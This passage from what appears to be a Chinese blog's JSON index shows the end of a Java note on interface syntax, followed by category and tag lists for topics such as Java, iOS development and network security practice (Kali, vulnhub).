implements 接口1，接口2, ... &#123; &#125;#2interface intf1 &#123; &#125;interface intf2 extends intf1 &#123; &#125; 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"}],"categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"},{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"},{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"},{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}]}